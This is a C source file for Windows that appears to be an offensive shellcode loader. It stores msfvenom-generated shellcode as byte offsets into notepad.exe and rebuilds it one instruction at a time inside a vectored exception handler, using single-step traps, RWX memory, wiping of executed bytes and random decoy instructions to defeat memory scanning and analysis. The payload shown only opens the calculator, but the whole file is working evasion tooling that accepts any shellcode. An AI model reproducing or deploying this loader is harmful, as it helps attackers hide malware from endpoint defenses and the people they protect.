#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <windows.h>


//#################################

//  To change between payloads:
//      1. uncomment
//      2. change file path from calc.exe to ntdll.dll (or vice versa)
//      3. comment out/uncomment the two lines that expose the string "calc"

//#################################

//msfvenom calc payload running from calc.exe
//const unsigned int Positions[] = {
//    2520, 673, 1043, 2200, 252, 60, 615, 3, 3, 3, 321, 3351, 321, 232, 216, 3351, 6711, 673, 1776, 1059, 99, 673, 1047, 216,
//    326, 673, 1047, 216, 273, 673, 1047, 216, 82, 673, 1047, 84, 232, 673, 1079, 1196, 1091, 1091, 1057, 1776, 1378, 673, 1776,
//    615, 2368, 1496, 88, 1983, 257, 412, 82, 321, 327, 1378, 117, 321, 74, 327, 1690, 3043, 216, 321, 3351, 673, 1047, 216, 82,
//    1047, 735, 1496, 673, 74, 504, 1047, 1050, 1343, 3, 3, 3, 673, 1058, 615, 96, 86, 673, 74, 504, 232, 1047, 673, 273, 108, 1047,
//    24, 82, 1112, 74, 504, 2302, 6711, 673, 12, 1378, 321, 1047, 1201, 1343, 673, 74, 161, 1057, 1776, 1378, 673, 1776, 615, 2368,
//    321, 327, 1378, 117, 321, 74, 327, 1214, 1188, 102, 12734, 75, 4, 75, 120, 330, 233, 2099, 1889, 102, 2662, 1948, 108, 1047,
//    24, 120, 1112, 74, 504, 1328, 321, 1047, 261, 673, 108, 1047, 24, 1273, 1112, 74, 504, 321, 1047, 8, 1343, 673, 74, 504, 321,
//    1948, 321, 1948, 9057, 5399, 1, 321, 1948, 321, 5399, 321, 1, 673, 1043, 1044, 82, 321, 216, 12, 1188, 1948, 321, 5399, 1, 673,
//    1047, 1241, 1689, 1377, 12, 12, 12, 1901, 673, 66, 74, 3, 3, 3, 3, 3, 3, 3, 673, 1176, 1176, 74, 74, 3, 3, 321, 66, 1776, 1047,
//    85, 2813, 12, 2925, 1719, 1188, 1558, 2434, 119, 321, 66, 1406, 134, 133, 186, 12, 2925, 673, 1043, 241, 464, 1496, 146, 1983, 119,
//    1050, 130, 1188, 102, 1264, 1719, 389, 1266, 84, 85, 202, 3, 5399, 321, 1090, 3843, 12, 2925, 91, 88, 699, 91, 3
//};

//const unsigned int bytesPerLine[] = {
//    1, 4, 5, 2, 2, 1, 1, 1,3,5,4,4,4,5,3,
//    3,1,2,2,2,4,3,2,1,2,4,3,3,6,3,2,3,1,3,
//    4,3,2,3,4,3,3,3,1,4,3,2,2,5,3,2,1,4,3,
//    5,4,3,4,3,2,2,1,1,1,2,2,2,4,2,2,1,2,1,
//    3,5,1,7,3,7,6,2,5,6,2,4,2,2,3,2,5,2,1,
//    3,2,3,2
//};

const unsigned int Positions[] = {

        2320, 1035, 1083, 1140, 276, 488, 296, 3, 3, 3, 1654, 2590, 1654, 256, 224, 2590,
        2278, 1035, 2299, 1369, 99, 1035, 1033, 224, 350, 1035, 1033, 224, 476, 1035, 1033, 224,
        82, 1035, 1033, 84, 256, 1035, 1355, 1582, 581, 581, 1500, 2299, 497, 1035, 2299, 296,
        441, 2000, 88, 265, 281, 2837, 82, 1654, 351, 497, 117, 1654, 61, 351, 2458, 2347,
        224, 1654, 2590, 1035, 1033, 224, 82, 1033, 799, 2000, 1035, 61, 401, 1033, 337, 568,
        3, 3, 3, 1035, 1426, 296, 96, 86, 1035, 61, 401, 256, 1033, 1035, 476, 108,
        1033, 24, 82, 1068, 61, 401, 5633, 2278, 1035, 12, 497, 1654, 1033, 1661, 568, 1035,
        61, 148, 1500, 2299, 497, 1035, 2299, 296, 441, 1654, 351, 497, 117, 1654, 61, 351,
        1674, 289, 102, 1111, 75, 4, 75, 120, 354, 257, 1438, 3008, 102, 264, 1134, 108,
        1033, 24, 120, 1068, 61, 401, 473, 1654, 1033, 737, 1035, 108, 1033, 24, 1439, 1068,
        61, 401, 1654, 1033, 8, 568, 1035, 61, 401, 1654, 1134, 1654, 1134, 3349, 2243, 1,
        1654, 1134, 1654, 2243, 1654, 1, 1035, 1083, 156, 82, 1654, 224, 12, 289, 1134, 1654,
        2243, 1, 1035, 1033, 657, 2119, 1045, 12, 12, 12, 1477, 1035, 66, 61, 3, 3,
        3, 3, 3, 3, 3, 1035, 1100, 1100, 61, 61, 3, 3, 1654, 66, 2299, 1033,
        85, 3767, 12, 4055, 2561, 289, 2029, 1310, 119, 1654, 66, 5742, 130, 5662, 1999, 12,
        4055, 1035, 1083, 1051, 1570, 2000, 202, 265, 119, 337, 134, 289, 102, 1044, 2561, 2032,
        129, 84, 85, 10386, 3, 2243, 1654, 1053, 1562, 12, 4055, 91, 88, 763, 91, 3
};

const unsigned int bytesPerLine[] = {

        1, 4, 5, 2, 2, 1, 1, 1, 3, 5, 4, 4, 4, 5, 3, 3,
        1, 2, 2, 2, 4, 3, 2, 1, 2, 4, 3, 3, 6, 3, 2, 3,
        1, 3, 4, 3, 2, 3, 4, 3, 3, 3, 1, 4, 3, 2, 2, 5,
        3, 2, 1, 4, 3, 5, 4, 3, 4, 3, 2, 2, 1, 1, 1, 2,
        2, 2, 4, 2, 2, 1, 2, 1, 3, 5, 1, 10, 7, 6, 2, 5,
        6, 2, 4, 2, 2, 3, 2, 5, 2, 1, 3, 2, 3, 2,
};

//extra bytes at the end of calc paylaod that need to be manually inserted
const unsigned char second_last[] = { 0x63, 0x61, 0x6c };
const unsigned char last[] = { 0x63, 0x00 };

//array of instructions from which random instruction execution is pulled
//Also used by writeMemoryBlock() function to fill memory block on first pass 
const unsigned char instruction[21][3] = {
    {0x48, 0x89, 0xD8},
    {0x48, 0xFF, 0xC0},
    {0x49, 0x89, 0xC4},
    {0x49, 0x39, 0xC4},
    {0x48, 0x31, 0xC0},
    {0x49, 0xFF, 0xCC},
    {0x49, 0xFF, 0xCC},
    {0x48, 0xFF, 0xC3},
    {0x48, 0xFF, 0xC8},
    {0x48, 0x01, 0xCB},
    {0x49, 0x29, 0xC9},
    {0x48, 0x39, 0xC3},
    {0x4D, 0x31, 0xD2},
    {0x48, 0x31, 0xC0},
    {0x48, 0xFF, 0xC1},
    {0x48, 0xFF, 0xC9},
    {0x4D, 0x31, 0xD2},
    {0x48, 0x39, 0xC3},
    {0x49, 0x01, 0xCC},
    {0x48, 0x01, 0xCB},
    {0x4D, 0x31, 0xD2}
};

PBYTE bFilePath = "C:\\Windows\\System32\\notepad.exe";  //the file the constructor used to build the arrays

DWORD64 bytesPerLineTracker = 0;           //this keeps track of where we are in the bytesPerLine array
DWORD64 payloadPosition = 0;               //this is a tracker for where we are in the Payload Array
int sizeOfBytesPerLine = (sizeof(bytesPerLine) / sizeof(bytesPerLine[0]));

PVOID baseAddress = NULL;           //base address of the payload
DWORD64 upperBound = NULL;          //the upper bound of the payload (end of allocated memory page)
PVOID dummyAddress = NULL;

BOOL FirstRun = TRUE;               //used for the first time the VEH runs

DWORD64 oldRIP = NULL;              //position of the RIP on the previous instruction so it can zero out that memory
DWORD64 nextRIP = NULL;             //the RIP where the next valid instruction will be executed from
DWORD64 currentRIP = NULL;          //the RIP where the valid instruction was executed so that the dummy instruction can be executed from the same place

CONTEXT ctx = { .ContextFlags = CONTEXT_CONTROL };    //saves the thread context so it can be resoted after dummy instructions

PBYTE pBullshitBuffer = NULL;           //used to store the bytes that are overwritten by the next instruction so they can be written back
SIZE_T bytesInBullshitBuffer = 0;       //stores the number of bytes to write back
PBYTE pDummyWriteBuffer = NULL;         //used to store the bytes that the dummy instruction generator overwrites so they can be written back
int sizeDummyWriteBuffer = 0;           //stores the number of bytes to write back

BOOL doingDummy = FALSE;                //this keeps track of whether we are in the process of doing a dummy instruction loop
                                        //so that it does not try and execute a dummy instruction loop in the middle of another
                                        //dummy instruction loop because this breaks the program


BOOL CreateDummyCode() {

    PBYTE PayloadBuffer = malloc(sizeof(BYTE) * 16 * 20);

    //choose how many instructions we are going to use for the dummy code
    int numberOfInstructions = (rand() % 19) + 1;
    printf("Using %d instructions\n\n", numberOfInstructions);
    int tracker = 0;

    //choose the instructions
    for (int i = 0; i < numberOfInstructions; i++) {
        int chosenInstruction = (rand() % 19) + 1;
        printf("Chosen instruction number: %d\n", chosenInstruction);
        for (int j = 0; j < 3; j++) {
            PayloadBuffer[tracker] = instruction[chosenInstruction][j];
            printf("%02x \n", PayloadBuffer[tracker]);
            tracker++;
        }
    }

    //add INT3 breakpoint at the end
    PayloadBuffer[tracker] = 0xCC;

    //show the instructions
    printf("The chosen instructions are:\n");
    for (int j = 0; j < tracker + 1; j++) {
        printf("%02x, ", PayloadBuffer[j]);
    }
    printf("\n\n");

    //save what was originally there so it can be restored
    sizeDummyWriteBuffer = tracker + 1;
    pDummyWriteBuffer = malloc(sizeof(BYTE) * 16 * 20);
    memcpy(pDummyWriteBuffer, dummyAddress, sizeDummyWriteBuffer);

    //write new dummy instruction
    memcpy(dummyAddress, PayloadBuffer, tracker + 1);
}

//function to fill the allocated memory block with random instructions - used on the first pass only
BOOL writeMemoryBlock(PVOID baseAddress) {
    DWORD64 writeOffset = 0;

    while (writeOffset < 4093) {             //write offset is one whole memory block (4096 bytes) minus the size of one instruction (3 bytes)
        //choose a random instruction
        int chosenInstruction = (rand() % 19) + 1;
        memcpy((DWORD64)baseAddress + writeOffset, instruction[chosenInstruction], 3);

        writeOffset += 3;
    }

}

BOOL BytesToBin(int positionNumber, int numberOfInstructions, PBYTE* bPayloadBuffer) {

    PBYTE filePath = bFilePath;

    FILE* file = NULL;
    SIZE_T bytesRead = 0;               //for comparing to fileSize to ensure all bytes are read
    SIZE_T fileSize = NULL;             //size of file being read
    PBYTE PayloadBuffer = NULL;         //buffer to hold the bytes - max 16 bytes in one instruction

    PayloadBuffer = malloc(sizeof(BYTE) * 16);

    //open file
    file = fopen(filePath, "rb");
    if (!file) {
        printf("[!] Error opening file. fopen failed with error %d\n", GetLastError());
        return FALSE;
    }

    //iterate through file and find the bytes in position number for the number of instructions required
    for (int i = 0; i < bytesPerLine[numberOfInstructions]; i++) {
        fseek(file, Positions[positionNumber + i], SEEK_SET);
        fread(&PayloadBuffer[i], sizeof(byte), 1, file);
        printf("%02x ", PayloadBuffer[i]);
        bytesRead++;
    }
    printf("\n");

    //make sure it read correctly
    if (bytesRead != bytesPerLine[numberOfInstructions]) {
        printf("[!] An error occurred reading the bytes: Error %d\n", GetLastError());
        fclose(file);
        return FALSE;
    }

    //cleanup
    if (file) {
        fclose(file);
    }

    *bPayloadBuffer = PayloadBuffer;

    printf("\n");

    return TRUE;
}

LONG CALLBACK BreakpointHandler(PEXCEPTION_POINTERS ExceptionInfo) {

    ExceptionInfo->ContextRecord->EFlags |= (1 << 8);

    if (FirstRun == TRUE) {
        //they should already be 0 but just double checking
        bytesPerLineTracker = 0;
        payloadPosition = 0;

        //write the extra bytes at the end of calc paylaod that need to be manually inserted
        memcpy((DWORD64)baseAddress + 0x10B, second_last, 3);
        memcpy((DWORD64)baseAddress + 0x10E, last, 2);

        FirstRun = FALSE;
    }

    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_ACCESS_VIOLATION) {
        printf("\nGot an exception violation error  :(\nRun the program again\n");
        //return EXCEPTION_CONTINUE_EXECUTION;
        return EXCEPTION_CONTINUE_SEARCH;
    }

    //used to deal with the end of the execution of dummy instructions
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {

        //set the CONTEXT back to where it is supposed to be to continue shellcode execution
        memcpy(ExceptionInfo->ContextRecord, &ctx, sizeof(CONTEXT));

        printf("The RIP is now back at: %p\n", ExceptionInfo->ContextRecord->Rip);
        printf("Continuing shellcode exection\n");

        //zero out dummy memory
        memcpy(dummyAddress, pDummyWriteBuffer, sizeDummyWriteBuffer);

        //dummy instruction loop complete
        doingDummy = FALSE;

        ExceptionInfo->ContextRecord->EFlags |= (1 << 8);

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    //if we are executing a dummy instruction ignore the single stepping and move on - the end of the dummy instruction is signlled by an INT3
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP && doingDummy == TRUE) {
        return EXCEPTION_CONTINUE_EXECUTION;
    }


    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP && doingDummy == FALSE) {

        //single step execution is disabled each run so reset it
        ExceptionInfo->ContextRecord->EFlags |= (1 << 8);

        //if the exception occurs outside our shellcode space do nothing
        if (ExceptionInfo->ContextRecord->Rip < (DWORD64)baseAddress || ExceptionInfo->ContextRecord->Rip > upperBound) {

            return EXCEPTION_CONTINUE_EXECUTION;
        }

        PBYTE pPayloadBuffer = NULL;

        memcpy(oldRIP, pBullshitBuffer, bytesInBullshitBuffer);

        printf("RIP is at %p\n", ExceptionInfo->ContextRecord->Rip);

        //determine position in Payload for next instruction
        //this should account for jumps as well as for loops where we are moving backward
        payloadPosition = payloadPosition + (ExceptionInfo->ContextRecord->Rip - oldRIP);

        //determine the position in bytesPerLine
        int total = 0;
        for (int j = 0; j < sizeOfBytesPerLine; j++) {
            total = total + bytesPerLine[j];
            if (total == payloadPosition) {
                bytesPerLineTracker = j + 1; //+1 because the array starts at 0
            }
        }

        //save what is currently at the next instruction position
        //set size of bullshitBuffer
        bytesInBullshitBuffer = bytesPerLine[bytesPerLineTracker];
        pBullshitBuffer = malloc(sizeof(BYTE) * bytesInBullshitBuffer);
        //copy the bytes that will be overwritten by the next instruction
        memcpy(pBullshitBuffer, ExceptionInfo->ContextRecord->Rip, bytesPerLine[bytesPerLineTracker]);

        //get the next instruction
        BytesToBin(payloadPosition, bytesPerLineTracker, &pPayloadBuffer);

        //write the next instruction
        memcpy(ExceptionInfo->ContextRecord->Rip, pPayloadBuffer, bytesPerLine[bytesPerLineTracker]);

        //also set oldRIP to this new one for the purpose of zeroing it out on the next run
        oldRIP = ExceptionInfo->ContextRecord->Rip;

        //randomy insert dummy instruction (only commence this if we are not already in a dummy instruction loop)
        int random = rand() % 100;
        printf("random: %d\n", random);

        //this sets the frequency of dummy code - currently set to 2%
        if (random < 2) {
            //going into a dummy instruction loop
            doingDummy = TRUE;

            printf("Rip is at breakpoint address: %p\n", ExceptionInfo->ContextRecord->Rip);
            printf("Commencing dummy instruction execution...\n");

            //save the current thread context
            memcpy(&ctx, ExceptionInfo->ContextRecord, sizeof(CONTEXT));
            CreateDummyCode();
            //point RIP at the dummy set of instructions
            ExceptionInfo->ContextRecord->Rip = dummyAddress;

            return EXCEPTION_CONTINUE_EXECUTION;
        }

        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}


int main() {

    //seed the random number generator
    srand(time(0));

    //generate random offset from where VirtualAlloc has allocated memory
    int sizeOfPayload = sizeof(Positions) / sizeof(Positions[0]);
    DWORD64 randomOffset = rand() % (4096 - sizeOfPayload);

    //allocate one page of memory for the payload
    PVOID rootAddress = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (rootAddress == NULL) {
        printf("[!] Failed to allocate memory. VirtualAlloc failed with error %d\n", GetLastError());
        return -1;
    }

    printf("[i] Memory allocated at: %p\n", rootAddress);

    //fill the memory block with bullshit
    writeMemoryBlock(rootAddress);

    //add the VEH
    HANDLE vh1 = AddVectoredExceptionHandler(1, BreakpointHandler);

    //create the thread suspended
    DWORD threadID = NULL;
    HANDLE hThread = CreateThread(NULL, NULL, rootAddress, NULL, CREATE_SUSPENDED, &threadID);
    if (!hThread) {
        printf("[!] Failed to create thread. Error %d\n", GetLastError());
        return -1;
    }

    printf("The threadID is: %d\n\n", threadID);

    //set the context flag for single step execution
    CONTEXT ctx = { .ContextFlags = CONTEXT_ALL };

    if (!GetThreadContext(hThread, &ctx)) {
        printf("[!] Failed to get thread context. GetThreadContext failed with error %d\n", GetLastError());
        return -1;
    }

    ctx.EFlags |= (1 << 8);

    if (!SetThreadContext(hThread, &ctx)) {
        printf("[!] Failed to set thread context. SetThreadContext failed with error %d\n", GetLastError());
        return -1;
    }

    //set the upperBound for use in the veh and oldRIP which is used in there too
    (DWORD64)baseAddress = (DWORD64)rootAddress + randomOffset;           //set a random starting address for the payload inside the newly allocated memory
    upperBound = (DWORD64)rootAddress + (DWORD64)4096;                    //this is the end of the allocat page
    oldRIP = baseAddress;

    //set the out of bounds area with two conditions:
        // must not intersect with the payload working area (plus 100 bytes before)
        // must not be within 100 bytes of the end of the memory block
    DWORD64 payloadStart = (DWORD64)baseAddress - 100;
    DWORD64 payloadEnd = (DWORD64)baseAddress + sizeOfPayload;

    do {
        (DWORD64)dummyAddress = (DWORD64)rootAddress + (rand() % 4096);
    } while (((DWORD64)dummyAddress > payloadStart && (DWORD64)dummyAddress < payloadEnd) || (DWORD64)dummyAddress > (upperBound - 100));


    printf("Payload working area starts at: %p\n", baseAddress);
    printf("Dummy Instruction Address is: %p\n\n", dummyAddress);

    ResumeThread(hThread);
    WaitForSingleObject(hThread, INFINITE);

    printf("[i] Execution complete. Press <ENTER> to exit...");
    getchar();

    CloseHandle(hThread);

    return 0;
}